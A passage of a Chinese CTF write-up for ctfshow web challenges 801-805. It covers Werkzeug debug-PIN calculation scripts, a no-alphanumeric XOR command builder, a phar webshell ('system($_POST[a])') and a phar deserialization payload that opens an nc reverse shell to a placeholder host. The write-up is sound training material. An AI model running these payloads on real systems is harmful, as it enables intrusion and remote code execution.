punctuation\">)</span> <span class=\"token keyword\">as</span> f<span class=\"token punctuation\">:</span>\n                    <span class=\"token keyword\">return</span> f<span class=\"token punctuation\">.</span>readline<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>strip<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">except</span> IOError<span class=\"token punctuation\">:</span>\n                <span class=\"token keyword\">continue</span>\n</code></pre>\n<p>可以看到先从/proc/self/cgroup判断是否是docker容器，如果有符合条件的值直接返回value；如果未在cgroup中读到/docker/后的内容<br/> 进行下一步，先后读取/etc/machine-id 和 boot_id中的值返回一个</p>\n<p>所以此处machine-id应为<br/> docker: cgroup中 /docker/后的内容<br/> 非docker: 先后读取machine-id和boot_id 有值即取</p>\n<h4><a id=\"werkzeug_100rc1_254\"></a>werkzeug 1.0.0rc1及以后</h4>\n<pre><code class=\"prism language-python\">    <span class=\"token keyword\">def</span> <span class=\"token function\">_generate</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        linux <span class=\"token operator\">=</span> <span class=\"token string\">b\"\"</span>\n\n        <span class=\"token comment\"># machine-id is stable across boots, boot_id is not.</span>\n        <span class=\"token keyword\">for</span> filename <span class=\"token keyword\">in</span> <span class=\"token string\">\"/etc/machine-id\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"/proc/sys/kernel/random/boot_id\"</span><span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span>\n                <span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span>filename<span class=\"token punctuation\">,</span> <span class=\"token string\">\"rb\"</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> f<span class=\"token punctuation\">:</span>\n                    value <span class=\"token operator\">=</span> f<span class=\"token punctuation\">.</span>readline<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>strip<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">except</span> IOError<span class=\"token punctuation\">:</span>\n                <span class=\"token keyword\">continue</span>\n\n            <span class=\"token keyword\">if</span> value<span class=\"token punctuation\">:</span>\n                linux <span class=\"token operator\">+=</span> value\n                <span class=\"token keyword\">break</span>\n\n        <span class=\"token comment\"># Containers share the same machine id, add some cgroup</span>\n        <span class=\"token comment\"># information. This is used outside containers too but should be</span>\n        <span class=\"token comment\"># relatively stable across boots.</span>\n        <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/proc/self/cgroup\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"rb\"</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> f<span class=\"token punctuation\">:</span>\n                linux <span class=\"token operator\">+=</span> f<span class=\"token punctuation\">.</span>readline<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>strip<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>rpartition<span class=\"token punctuation\">(</span><span class=\"token string\">b\"/\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span>\n        <span class=\"token keyword\">except</span> IOError<span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">pass</span>\n\n        <span class=\"token keyword\">if</span> linux<span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">return</span> linux\n</code></pre>\n<p>先从/etc/machine-id和/proc/sys/kernel/random/boot_id读出一个就跳出，然后再读取/proc/self/cgroup中的id值拼接<br/> 所以此处machine-id为<br/> /etc/machine-id + /proc/self/cgroup<br/> 或<br/> /proc/sys/kernel/random/boot_id + /proc/self/cgroup</p>\n<h3><a id=\"36_MD5_290\"></a>3.6 MD5</h3>\n<pre><code class=\"prism language-python\"><span class=\"token comment\">#MD5</span>\n<span class=\"token keyword\">import</span> hashlib\n<span class=\"token keyword\">from</span> itertools <span class=\"token keyword\">import</span> chain\nprobably_public_bits <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>\n     <span class=\"token string\">'flaskweb'</span><span class=\"token comment\"># username</span>\n     <span class=\"token string\">'flask.app'</span><span class=\"token punctuation\">,</span><span class=\"token comment\"># modname</span>\n     <span class=\"token string\">'Flask'</span><span class=\"token punctuation\">,</span><span class=\"token comment\"># getattr(app, '__name__', getattr(app.__class__, '__name__'))</span>\n     <span class=\"token string\">'/usr/local/lib/python3.7/site-packages/flask/app.py'</span> <span class=\"token comment\"># getattr(mod, '__file__', None),</span>\n<span class=\"token punctuation\">]</span>\n\nprivate_bits <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>\n     <span class=\"token string\">'25214234362297'</span><span class=\"token punctuation\">,</span><span class=\"token comment\"># str(uuid.getnode()),  /sys/class/net/ens33/address</span>\n     <span class=\"token string\">'0402a7ff83cc48b41b227763d03b386cb5040585c82f3b99aa3ad120ae69ebaa'</span><span class=\"token comment\"># get_machine_id(), /etc/machine-id</span>\n<span class=\"token punctuation\">]</span>\n\nh <span class=\"token operator\">=</span> hashlib<span class=\"token punctuation\">.</span>md5<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">for</span> bit <span class=\"token keyword\">in</span> chain<span class=\"token punctuation\">(</span>probably_public_bits<span class=\"token punctuation\">,</span> private_bits<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">if</span> <span class=\"token keyword\">not</span> bit<span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">continue</span>\n    <span class=\"token keyword\">if</span> <span class=\"token builtin\">isinstance</span><span class=\"token punctuation\">(</span>bit<span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        bit <span class=\"token operator\">=</span> bit<span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token string\">'utf-8'</span><span class=\"token punctuation\">)</span>\n    h<span class=\"token punctuation\">.</span>update<span class=\"token punctuation\">(</span>bit<span class=\"token punctuation\">)</span>\nh<span class=\"token punctuation\">.</span>update<span class=\"token punctuation\">(</span><span class=\"token string\">b'cookiesalt'</span><span class=\"token punctuation\">)</span>\n\ncookie_name <span class=\"token operator\">=</span> <span class=\"token string\">'__wzd'</span> <span class=\"token operator\">+</span> h<span class=\"token punctuation\">.</span>hexdigest<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token number\">20</span><span class=\"token punctuation\">]</span>\n\nnum <span class=\"token operator\">=</span> <span class=\"token boolean\">None</span>\n<span class=\"token keyword\">if</span> num <span class=\"token keyword\">is</span> <span class=\"token boolean\">None</span><span class=\"token punctuation\">:</span>\n   h<span class=\"token punctuation\">.</span>update<span class=\"token punctuation\">(</span><span class=\"token string\">b'pinsalt'</span><span class=\"token punctuation\">)</span>\n   num <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token string\">'%09d'</span> <span class=\"token operator\">%</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>h<span class=\"token punctuation\">.</span>hexdigest<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token number\">9</span><span class=\"token punctuation\">]</span>\n\nrv <span class=\"token operator\">=</span><span class=\"token boolean\">None</span>\n<span class=\"token keyword\">if</span> rv <span class=\"token keyword\">is</span> <span class=\"token boolean\">None</span><span class=\"token punctuation\">:</span>\n   <span class=\"token keyword\">for</span> group_size <span class=\"token keyword\">in</span> <span class=\"token number\">5</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">:</span>\n       <span class=\"token keyword\">if</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> group_size <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span>\n          rv <span class=\"token operator\">=</span> <span class=\"token string\">'-'</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">[</span>x<span class=\"token punctuation\">:</span>x <span class=\"token operator\">+</span> group_size<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>rjust<span class=\"token punctuation\">(</span>group_size<span class=\"token punctuation\">,</span> <span class=\"token string\">'0'</span><span class=\"token punctuation\">)</span>\n                      <span class=\"token keyword\">for</span> x <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> group_size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n          <span class=\"token keyword\">break</span>\n       <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n          rv <span class=\"token operator\">=</span> num\n\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>rv<span class=\"token punctuation\">)</span>\n\n</code></pre>\n<h3><a id=\"38_sha1_337\"></a>3.8 sha1</h3>\n<pre><code class=\"prism language-python\"><span class=\"token comment\">#sha1</span>\n<span class=\"token keyword\">import</span> hashlib\n<span class=\"token keyword\">from</span> itertools <span class=\"token keyword\">import</span> chain\nprobably_public_bits <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>\n    <span class=\"token string\">'root'</span><span class=\"token comment\"># /etc/passwd</span>\n    <span class=\"token string\">'flask.app'</span><span class=\"token punctuation\">,</span><span class=\"token comment\"># 默认值</span>\n    <span class=\"token string\">'Flask'</span><span class=\"token punctuation\">,</span><span class=\"token comment\"># 默认值</span>\n    <span class=\"token string\">'/usr/local/lib/python3.8/site-packages/flask/app.py'</span> <span class=\"token comment\"># 报错得到</span>\n<span class=\"token punctuation\">]</span>\n\nprivate_bits <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>\n    <span class=\"token string\">'2485377581187'</span><span class=\"token punctuation\">,</span><span class=\"token comment\">#  /sys/class/net/eth0/address 16进制转10进制</span>\n    <span class=\"token comment\">#machine_id由三个合并(docker就后两个)：1./etc/machine-id 2./proc/sys/kernel/random/boot_id 3./proc/self/cgroup</span>\n    <span class=\"token string\">'653dc458-4634-42b1-9a7a-b22a082e1fce55d22089f5fa429839d25dcea4675fb930c111da3bb774a6ab7349428589aefd'</span><span class=\"token comment\">#  /proc/self/cgroup</span>\n<span class=\"token punctuation\">]</span>\n\nh <span class=\"token operator\">=</span> hashlib<span class=\"token punctuation\">.</span>sha1<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">for</span> bit <span class=\"token keyword\">in</span> chain<span class=\"token punctuation\">(</span>probably_public_bits<span class=\"token punctuation\">,</span> private_bits<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">if</span> <span class=\"token keyword\">not</span> bit<span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">continue</span>\n    <span class=\"token keyword\">if</span> <span class=\"token builtin\">isinstance</span><span class=\"token punctuation\">(</span>bit<span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        bit <span class=\"token operator\">=</span> bit<span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token string\">'utf-8'</span><span class=\"token punctuation\">)</span>\n    h<span class=\"token punctuation\">.</span>update<span class=\"token punctuation\">(</span>bit<span class=\"token punctuation\">)</span>\nh<span class=\"token punctuation\">.</span>update<span class=\"token punctuation\">(</span><span class=\"token string\">b'cookiesalt'</span><span class=\"token punctuation\">)</span>\n\ncookie_name <span class=\"token operator\">=</span> <span class=\"token string\">'__wzd'</span> <span class=\"token operator\">+</span> h<span class=\"token punctuation\">.</span>hexdigest<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token number\">20</span><span class=\"token punctuation\">]</span>\n\nnum <span class=\"token operator\">=</span> <span class=\"token boolean\">None</span>\n<span class=\"token keyword\">if</span> num <span class=\"token keyword\">is</span> <span class=\"token boolean\">None</span><span class=\"token punctuation\">:</span>\n    h<span class=\"token punctuation\">.</span>update<span class=\"token punctuation\">(</span><span class=\"token string\">b'pinsalt'</span><span class=\"token punctuation\">)</span>\n    num <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token string\">'%09d'</span> <span class=\"token operator\">%</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>h<span class=\"token punctuation\">.</span>hexdigest<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token number\">9</span><span class=\"token punctuation\">]</span>\n\nrv <span class=\"token operator\">=</span><span class=\"token boolean\">None</span>\n<span class=\"token keyword\">if</span> rv <span class=\"token keyword\">is</span> <span class=\"token boolean\">None</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">for</span> group_size <span class=\"token keyword\">in</span> <span class=\"token number\">5</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">if</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> group_size <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span>\n            rv <span class=\"token operator\">=</span> <span class=\"token string\">'-'</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">[</span>x<span class=\"token punctuation\">:</span>x <span class=\"token operator\">+</span> group_size<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>rjust<span class=\"token punctuation\">(</span>group_size<span class=\"token punctuation\">,</span> <span class=\"token string\">'0'</span><span class=\"token punctuation\">)</span>\n                          <span class=\"token keyword\">for</span> x <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> group_size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">break</span>\n    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n        rv <span class=\"token operator\">=</span> num\n\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>rv<span class=\"token punctuation\">)</span>\n\n\n</code></pre>\n<h3><a id=\"web801_386\"></a>实操一下web801</h3>\n<p>username看到带shell的也就root了<br/> <img alt=\"在这里插入图片描述\" src=\"image\\ad2932de14414d7c971c1b95190fe036.png\"/><br/> 接下来两个都是默认值<br/> moddir<br/> /usr/local/lib/python3.8/site-packages/flask/app.py<br/> <img alt=\"在这里插入图片描述\" src=\"image\\19256f104004499b83b0eac38d370dc0.png\"/><br/> MAC<br/> 2485377618015<br/> <img alt=\"在这里插入图片描述\" src=\"image\\06c17d8530fc4395bd5ec10ce806672a.png\"/><br/> machine-id<br/> 653dc458-4634-42b1-9a7a-b22a082e1fceed5c8ceff0d394a6cb7c28766faf1e8f4e5ef6a8e2ccbea7d1577e858915b0d1<br/> <img alt=\"在这里插入图片描述\" src=\"image\\e431149e4421471a8fd833fd859134fb.png\"/><br/> <img alt=\"在这里插入图片描述\" src=\"image\\987711072f0945fda67b3e2a98d6827e.png\"/><br/> <img alt=\"在这里插入图片描述\" src=\"image\\b71827f5017a47e2af4be491394163eb.png\"/></p>\n<h1><a id=\"802__401\"></a>802 无字母数字命令执行</h1>\n<h3><a id=\"_402\"></a>异或法</h3>\n<p>通过自增方式获得所有字母<br/> <img alt=\"在这里插入图片描述\" src=\"image\\60bb974aec0c4798bc6b7a8d2607e635.png\"/><br/> 嫖个师傅脚本<br/> 羽师傅我的超人</p>\n<blockquote>\n<p>https://blog.csdn.net/miuzzx/article/details/109143413</p>\n</blockquote>\n<pre><code class=\"prism language-python\"><span class=\"token comment\"># -*- coding: utf-8 -*-</span>\n\n<span class=\"token comment\"># author yu22x</span>\n\n<span class=\"token keyword\">import</span> requests\n<span class=\"token keyword\">import</span> urllib\n<span class=\"token keyword\">from</span> sys <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\n<span class=\"token keyword\">import</span> os\n<span class=\"token keyword\">def</span> <span class=\"token function\">action</span><span class=\"token punctuation\">(</span>arg<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n   s1<span class=\"token operator\">=</span><span class=\"token string\">\"\"</span>\n   s2<span class=\"token operator\">=</span><span class=\"token string\">\"\"</span>\n   <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> arg<span class=\"token punctuation\">:</span>\n       f<span class=\"token operator\">=</span><span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"xor_rce.txt\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"r\"</span><span class=\"token punctuation\">)</span>\n       <span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span>\n           t<span class=\"token operator\">=</span>f<span class=\"token punctuation\">.</span>readline<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n           <span class=\"token keyword\">if</span> t<span class=\"token operator\">==</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">:</span>\n               <span class=\"token keyword\">break</span>\n           <span class=\"token keyword\">if</span> t<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token operator\">==</span>i<span class=\"token punctuation\">:</span>\n               <span class=\"token comment\">#print(i)</span>\n               s1<span class=\"token operator\">+=</span>t<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span>\n               s2<span class=\"token operator\">+=</span>t<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token number\">9</span><span class=\"token punctuation\">]</span>\n               <span class=\"token keyword\">break</span>\n       f<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n   output<span class=\"token operator\">=</span><span class=\"token string\">\"(\\\"\"</span><span class=\"token operator\">+</span>s1<span class=\"token operator\">+</span><span class=\"token string\">\"\\\"^\\\"\"</span><span class=\"token operator\">+</span>s2<span class=\"token operator\">+</span><span class=\"token string\">\"\\\")\"</span>\n   <span class=\"token keyword\">return</span><span class=\"token punctuation\">(</span>output<span class=\"token punctuation\">)</span>\n   \n<span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span>\n   param<span class=\"token operator\">=</span>action<span class=\"token punctuation\">(</span><span class=\"token builtin\">input</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\n[+] your function：\"</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>action<span class=\"token punctuation\">(</span><span class=\"token builtin\">input</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[+] your command：\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">\";\"</span>\n   <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>param<span class=\"token punctuation\">)</span>\n\n</code></pre>\n<p><img alt=\"在这里插入图片描述\" src=\"image\\54e2b31cca9d4e26af792f9b79671601.png\"/></p>\n<h1><a id=\"803_phar_444\"></a>803 phar文件包含</h1>\n<p>下次一定一定记得 没有写权限就往tmp临时目录写…<br/> phar包就当压缩包用了<br/> 贴源码</p>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n\n<span class=\"token comment\"># -*- coding: utf-8 -*-</span>\n<span class=\"token comment\"># @Author: h1xa</span>\n<span class=\"token comment\"># @Date:   2022-03-19 12:10:55</span>\n<span class=\"token comment\"># @Last Modified by:   h1xa</span>\n<span class=\"token comment\"># @Last Modified time: 2022-03-19 13:27:18</span>\n<span class=\"token comment\"># @email: h1xa@ctfer.com</span>\n<span class=\"token comment\"># @link: https://ctfer.com</span>\n\n\n<span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$content</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'content'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$content</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/php|data|ftp/i'</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">file_exists</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'.txt'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token keyword\">include</span> <span class=\"token variable\">$file</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'.txt'</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token function\">file_put_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$content</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n\n</code></pre>\n<p>可能不谈反序列化，有的人就不想用phar了…<br/> 不用自定义meta-data了</p>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n    \n   \n    <span class=\"token variable\">$phar</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Phar</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"phar.phar\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//后缀名必须为phar</span>\n   \n    <span class=\"token variable\">$phar</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">startBuffering</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$phar</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">setStub</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'&lt;?php __HALT_COMPILER(); ?&gt;'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//设置stub</span>\n    \n     \n    <span class=\"token variable\">$phar</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">addFromString</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'test.txt'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'&lt;?php system($_POST[a]);?&gt;'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//</span>\n    <span class=\"token variable\">$phar</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">stopBuffering</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token comment\">// phar生成</span>\n\n<span class=\"token operator\">?</span><span class=\"token operator\">&gt;</span>\n</code></pre>\n<p>记住有个东西叫从文件粘贴…<br/> <img alt=\"在这里插入图片描述\" src=\"image\\ea324e1a84ef4cdd88c6ce02b60097d3.png\"/></p>\n<p>php单引号和双引号包裹的区别<br/> <img alt=\"在这里插入图片描述\" src=\"image\\516f0705e59f4631a0081b866b6d46eb.png\"/><br/> <img alt=\"在这里插入图片描述\" src=\"image\\aa2c29daec2243548dc9091db35b8e6d.png\"/></p>\n<h1><a id=\"804_phar_501\"></a>804 phar反序列化</h1>\n<p>老生常谈了 题目中如果没有unserialize函数<br/> 写过</p>\n<blockquote>\n<p>https://blog.csdn.net/weixin_45751765/article/details/123733647?spm=1001.2014.3001.5501</p>\n</blockquote>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n    <span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">hacker</span><span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$code</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">code</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n    <span class=\"token comment\">// @unlink(\"phar.phar\");</span>\n    <span class=\"token variable\">$phar</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Phar</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"phar.phar\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//后缀名必须为phar</span>\n    <span class=\"token comment\">// $phar = $phar-&gt;convertToExecutable(Phar::TAR, Phar::GZ); //压缩规避敏感字符</span>\n    <span class=\"token variable\">$phar</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">startBuffering</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$phar</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">setStub</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"GIF89a\"</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"&lt;?php __HALT_COMPILER(); ?&gt;\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//设置stub</span>\n    <span class=\"token variable\">$o</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">hacker</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$o</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">code</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"system('nc xxxx 7777 -e /bin/sh');\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$phar</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">setMetadata</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$o</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//将自定义的meta-data存入manifest</span>\n    <span class=\"token variable\">$phar</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">addFromString</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"test.txt\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"test\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//添加要压缩的文件</span>\n    <span class=\"token comment\">//签名自动计算</span>\n    <span class=\"token variable\">$phar</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">stopBuffering</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token comment\">// phar生成</span>\n\n<span class=\"token operator\">?</span><span class=\"token operator\">&gt;</span>\n</code></pre>\n<p>利用函数file_exist触发phar解析<br/> <img alt=\"在这里插入图片描述\" src=\"image\\64a2e7fa63c841a6aae8ae34a8b61826.png\"/></p>\n<p><img alt=\"在这里插入图片描述\" src=\"image\\709a62956d9f4a3e9cbcb928871575be.png\"/></p>\n<h1><a id=\"805_open_basedir_534\"></a>805 open_basedir绕过</h1>\n<p>glob探测目录</p>\n<pre><code 